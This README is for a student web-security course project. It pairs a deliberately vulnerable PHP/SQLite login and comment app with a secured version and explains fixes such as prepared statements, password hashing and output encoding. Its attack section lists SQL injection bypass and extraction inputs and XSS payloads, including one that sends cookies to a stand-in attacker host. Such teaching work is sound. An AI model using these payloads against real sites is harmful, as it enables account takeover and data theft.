# SQL Injection, XSS, and Secure Development Demo

## PHP + SQLite Login and Comment System

**Authors:** Fucun Zhou, Jingjing Duan, Jiaxin Fan, Yan Fei  
**Course:** Web Development and Internet Applications - Algonquin College

---

## Project Overview

This project demonstrates common web application vulnerabilities and their solutions through a PHP + SQLite login and comment system. It includes two versions:

1. **Vulnerable Version** (`/vulnerable`) - Demonstrates security flaws
2. **Secure Version** (`/secure`) - Implements proper security measures

---

## Vulnerabilities Demonstrated

### 1. SQL Injection (SQLi)
- **Vulnerable:** Direct string concatenation in SQL queries
- **Secure:** PDO prepared statements with parameterized queries

### 2. Cross-Site Scripting (XSS)
- **Vulnerable:** Raw user input displayed without encoding
- **Secure:** `htmlspecialchars()` output encoding + input sanitization

### 3. Password Management
- **Vulnerable:** Plain text password storage
- **Secure:** `password_hash()` with Argon2ID/Bcrypt + `password_verify()`

### 4. Session Security
- **Vulnerable:** No session regeneration, insecure cookie flags
- **Secure:** Session regeneration, HttpOnly, Secure, SameSite flags

### 5. Database Security
- **Vulnerable:** Database in public webroot, no access control
- **Secure:** Database outside webroot, row-level security, audit logging

### 6. Data Encryption
- **Vulnerable:** Sensitive data stored in plain text
- **Secure:** AES-256-GCM encryption for sensitive fields

---

## Installation

### Requirements
- PHP 8.0+ with SQLite3 and OpenSSL extensions
- Web server (Apache/Nginx) or PHP built-in server

### Setup

1. **Initialize the databases:**
   ```bash
   cd web-security-demo
   php setup/init_db.php
   ```

2. **Run the vulnerable version:**
   ```bash
   cd vulnerable
   php -S localhost:8080
   ```
   Access at: http://localhost:8080

3. **Run the secure version:**
   ```bash
   cd secure
   php -S localhost:8081
   ```
   Access at: http://localhost:8081

---

## Test Accounts

After initialization, use these credentials:

| Username | Password | Role |
|----------|----------|------|
| admin    | admin123 | Admin |
| user1    | password1 | User |
| user2    | password2 | User |

---

## Attack Demonstrations

### SQL Injection Attack (Vulnerable Version)

**Login bypass:**
```
Username: ' OR '1'='1' --
Password: anything
```

**Data extraction:**
```
Username: ' UNION SELECT 1,username,password FROM users--
Password: anything
```

### XSS Attack (Vulnerable Version)

**Stored XSS in comments:**
```html
<script>alert('XSS Attack!')</script>
```

**Cookie theft:**
```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

---

## Security Features (Secure Version)

### PDO Prepared Statements
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute([':username' => $username]);
```

### Password Hashing
```php
// Hashing
$hash = password_hash($password, PASSWORD_ARGON2ID);

// Verification
if (password_verify($input, $hash)) { /* valid */ }
```

### Output Encoding
```php
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
```

### Secure Sessions
```php
session_set_cookie_params([
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
session_regenerate_id(true);
```

### Data Encryption (AES-256-GCM)
```php
$encrypted = encrypt_data($plaintext, $key);
$decrypted = decrypt_data($encrypted, $key);
```

### Database Audit Logging
All INSERT/UPDATE operations on comments are logged with:
- User ID
- Action type
- Timestamp
- Old and new values

---

## Project Structure

```
web-security-demo/
├── README.md
├── vulnerable/
│   ├── index.php          # Login page
│   ├── login.php          # Login handler (SQLi vulnerable)
│   ├── register.php       # Registration
│   ├── comments.php       # Comment system (XSS vulnerable)
│   ├── logout.php
│   ├── db/
│   │   └── database.sqlite  # DB in webroot (vulnerable!)
│   ├── includes/
│   │   └── db.php
│   └── assets/
│       └── style.css
├── secure/
│   ├── index.php          # Login page
│   ├── login.php          # Secure login handler
│   ├── register.php       # Secure registration
│   ├── comments.php       # Secure comment system
│   ├── logout.php
│   ├── includes/
│   │   ├── db.php         # PDO connection
│   │   ├── auth.php       # Authentication functions
│   │   ├── sanitize.php   # Input sanitization
│   │   └── crypto.php     # Encryption functions
│   ├── scripts/
│   │   └── backup.sh      # Database backup script
│   └── assets/
│       └── style.css
├── data/                   # Outside webroot
│   └── secure_database.sqlite
└── setup/
    └── init_db.php        # Database initialization
```

---

## Backup and Recovery

### Create Backup
```bash
./secure/scripts/backup.sh
```

### Restore from Backup
```bash
cp backups/backup_TIMESTAMP.sqlite data/secure_database.sqlite
```

---

## License

Educational use only - Algonquin College Web Security Course Project
